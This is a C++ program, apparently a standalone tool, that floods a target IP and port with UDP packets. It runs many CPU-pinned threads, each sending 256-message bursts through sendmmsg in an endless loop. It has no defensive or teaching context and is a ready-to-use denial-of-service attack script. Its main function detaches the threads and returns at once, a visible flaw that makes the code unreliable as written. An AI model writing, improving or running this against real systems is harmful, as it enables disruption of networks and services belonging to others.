#include <iostream>
#include <thread>
#include <vector>
#include <cstring>
#include <cstdlib>
#include <chrono>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/in.h>
#include <linux/socket.h>
#include <sys/types.h> 

const int MSG_COUNT = 256; // burst count per syscall

void flood(const char* ip, int port, int payload_size) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    char buffer[1500];
    memset(buffer, 'A', sizeof(buffer));

    struct mmsghdr msgs[MSG_COUNT];
    struct iovec iovecs[MSG_COUNT];

    for (int i = 0; i < MSG_COUNT; ++i) {
        iovecs[i].iov_base = buffer;
        iovecs[i].iov_len = payload_size;
        msgs[i].msg_hdr.msg_iov = &iovecs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &addr;
        msgs[i].msg_hdr.msg_namelen = sizeof(addr);
    }

    while (true) {
        sendmmsg(sock, msgs, MSG_COUNT, 0);
    }

    close(sock);
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        std::cerr << "Usage: " << argv[0] << " <IP> <PORT> <THREADS>\n";
        return 1;
    }

    const char* ip = argv[1];
    int port = std::atoi(argv[2]);
    int threads = std::atoi(argv[3]);
    int payload_size = 1472;

    std::vector<std::thread> workers;
    for (int i = 0; i < threads; ++i) {
    workers.emplace_back(flood, ip, port, payload_size);
    
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(i % std::thread::hardware_concurrency(), &cpuset);
    pthread_setaffinity_np(workers.back().native_handle(), sizeof(cpu_set_t), &cpuset);
    } 
  

    for (auto& t : workers) {
    t.detach(); // runs independently in the background
    }


    return 0;
}

